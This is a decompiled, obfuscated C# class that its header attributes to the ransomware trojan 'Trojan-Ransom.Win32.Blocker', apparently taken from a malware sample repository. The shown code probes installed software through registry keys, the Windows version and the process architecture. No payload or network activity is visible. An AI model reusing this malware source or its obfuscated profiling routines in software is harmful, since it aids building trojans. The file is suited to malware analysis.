// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SEX2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=a5787988e1da7ee4
// MVID: 027F678B-7D46-4866-9354-BA5F76CF2B30
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asdg-51ed8d1a92fbb8f059c9595d28994dd3b17eb92e.exe

using \u0001;
using \u0005;
using \u0006;
using Microsoft.Win32;
using SmartAssembly.SmartUsageCore;
using System;
using System.Runtime.InteropServices;

namespace \u0005
{
  internal static class \u0003
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    static \u0003() => \u0004.\u0002(typeof (\u0003));

    public static void \u0002()
    {
      int num1;
      int num2;
      int num3;
      try
      {
        try
        {
          while (\u0003.\u0002(\u0003.\u0001(1647)))
          {
            \u0003.\u0002(\u0003.\u0001(1652));
            if (true)
              goto label_14;
          }
label_2:
          int num4 = \u0003.\u0002(\u0003.\u0001(1693)) ? 1 : 0;
label_3:
          if (num4 != 0)
          {
            \u0003.\u0002(\u0003.\u0001(1702));
          }
          else
          {
            if (true)
            {
              if (\u0003.\u0002(\u0003.\u0001(1743)))
              {
                \u0003.\u0002(\u0003.\u0001(1752));
                goto label_14;
              }
              else if (\u0003.\u0002(\u0003.\u0001(1793)))
              {
                \u0003.\u0002(\u0003.\u0001(1810));
                goto label_14;
              }
              else if (true)
              {
                if (!\u0003.\u0002(\u0003.\u0001(1851)))
                  goto label_14;
              }
              else
                goto label_2;
            }
            \u0003.\u0002(\u0003.\u0001(1864));
          }
label_14:
          int num5;
          do
          {
            int num6 = \u0014\u0003.\u007E\u0001\u0004((object) \u0017\u0004.\u007E\u0018\u0003((object) \u0010\u0004.\u009D\u0002()));
            if (true)
              goto label_27;
label_15:
            switch (num1)
            {
              case 5:
                int num7 = \u0014\u0003.\u007E\u0002\u0004((object) \u0017\u0004.\u007E\u0018\u0003((object) \u0010\u0004.\u009D\u0002()));
                if (true)
                  goto label_28;
label_17:
                switch (num2)
                {
                  case 0:
                    \u0003.\u0002(\u0003.\u0001(1905));
                    goto label_26;
                  case 1:
                    \u0003.\u0002(\u0003.\u0001(1938));
                    goto label_26;
                  case 2:
                    \u0003.\u0002(\u0003.\u0001(1967));
                    goto label_26;
                  default:
                    goto label_26;
                }
label_28:
                num2 = num7;
                goto label_17;
              case 6:
                int num8 = \u0014\u0003.\u007E\u0002\u0004((object) \u0017\u0004.\u007E\u0018\u0003((object) \u0010\u0004.\u009D\u0002()));
                if (true)
                  goto label_29;
label_22:
                num5 = num3;
                if (true)
                {
                  switch (num5)
                  {
                    case 0:
                      \u0003.\u0002(\u0003.\u0001(2000));
                      continue;
                    case 1:
                      goto label_25;
                    default:
                      goto label_26;
                  }
                }
                else
                  goto label_10;
label_29:
                num3 = num8;
                goto label_22;
              default:
                goto label_26;
            }
label_27:
            num1 = num6;
            goto label_15;
          }
          while (false);
          goto label_26;
label_10:
          num4 = num5;
          goto label_3;
label_25:
          \u0003.\u0002(\u0003.\u0001(2041));
label_26:
          \u0003.\u0003();
          \u0003.\u0004();
          \u0003.\u0005();
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num3;
        \u0008.\u0008.\u0002(ex, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    public static void \u0003()
    {
      try
      {
        try
        {
          \u0003.\u0002(\u0003.\u0001(2078) + (object) \u000E\u0004.\u009B\u0002());
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex);
        throw;
      }
    }

    public static void \u0004()
    {
      try
      {
        try
        {
          \u0003.\u0002(\u0003.\u0001(2107) + \u0003\u0005.\u0099\u0005().Name);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex);
        throw;
      }
    }

    public static void \u0005()
    {
      try
      {
        try
        {
          \u0003.\u0002(\u0003.\u0001(2140) + (object) (\u0003.\u0002() ? 64 : 32));
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex);
        throw;
      }
    }

    private static bool \u0002()
    {
      bool wow64Process;
      try
      {
        if (\u000E\u0004.\u0013\u0003() != 8)
          goto label_4;
label_1:
        int num1 = 0;
label_2:
        if (num1 == 0)
          return true;
        goto label_7;
label_4:
        if (true)
        {
          int num2 = \u0003.\u0002(\u0003.\u0001(2169), \u0003.\u0001(2186)) ? 1 : 0;
          if (false)
          {
            num1 = num2;
            goto label_2;
          }
          else if (num2 == 0)
            goto label_12;
          else
            goto label_13;
        }
        else
          goto label_9;
label_7:
        if (true)
        {
          if (false)
            goto label_4;
        }
        else
          goto label_1;
label_9:
        if (true)
        {
          if (true)
          {
            if (true)
              return wow64Process;
            goto label_4;
          }
        }
        else
          goto label_13;
label_12:
        return false;
label_13:
        if (!\u0003.\u0002(\u0003.\u0002(), out wow64Process))
          goto label_12;
        else
          goto label_7;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) wow64Process;
        \u0008.\u0008.\u0002(ex, (object) local);
        throw;
      }
    }

    private static bool \u0002([In] string obj0, [In] string obj1)
    {
      IntPtr hModule;
      try
      {
        IntPtr num1 = \u0003.\u0002(obj0);
        if (true)
          goto label_10;
label_8:
        IntPtr num2 = hModule;
        int num3;
        if (true)
        {
          IntPtr zero = IntPtr.Zero;
          num3 = num2 == zero ? 1 : 0;
        }
        else
          goto label_6;
label_2:
        if (num3 != 0)
        {
          num3 = 0;
        }
        else
        {
          num2 = \u0003.\u0002(hModule, obj1);
          goto label_6;
        }
label_4:
        if (num3 == 0)
          return num3 != 0;
        goto label_2;
label_6:
        IntPtr zero1 = IntPtr.Zero;
        num3 = num2 != zero1 ? 1 : 0;
        if (true)
          return num3 != 0;
        goto label_4;
label_10:
        hModule = num1;
        goto label_8;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local = (ValueType) hModule;
        string str1 = obj0;
        string str2 = obj1;
        \u0008.\u0008.\u0002(ex, (object) local, (object) str1, (object) str2);
        throw;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr \u0002();

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto)]
    private static extern IntPtr \u0002([In] string obj0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr \u0002(IntPtr hModule, [MarshalAs(UnmanagedType.LPStr)] string procName);

    [DllImport("kernel32.dll", EntryPoint = "IsWow64Process", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0002(IntPtr hProcess, out bool wow64Process);

    private static bool \u0002([In] string obj0)
    {
      RegistryKey registryKey1;
      bool flag;
      try
      {
        if (true)
        {
          if (true)
            goto label_17;
label_2:
          try
          {
            RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(\u0003.\u0001(2207) + obj0);
            if (true)
              goto label_12;
label_10:
            if (registryKey1 == null)
            {
              RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(\u0003.\u0001(2268) + obj0);
              if (true)
                registryKey1 = registryKey3;
            }
            do
            {
              do
              {
                if (true)
                  goto label_11;
label_5:
                continue;
label_11:
                int num = registryKey1 != null ? 1 : 0;
                if (true)
                {
                  flag = num != 0;
                  goto label_5;
                }
                else
                  goto label_5;
              }
              while (false);
              if (false)
                break;
            }
            while (false);
            goto label_16;
label_12:
            registryKey1 = registryKey2;
            goto label_10;
          }
          finally
          {
            if (registryKey1 != null)
              \u001B\u0003.\u007E\u000E\u0006((object) registryKey1);
          }
label_17:
          registryKey1 = (RegistryKey) null;
          goto label_2;
        }
label_16:
        return flag;
      }
      catch (Exception ex)
      {
        RegistryKey registryKey4 = registryKey1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) flag;
        string str = obj0;
        \u0008.\u0008.\u0002(ex, (object) registryKey4, (object) local, (object) str);
        throw;
      }
    }

    public static void \u0002([FeatureName] string featureName) => \u0004.\u0003(featureName);
  }
}
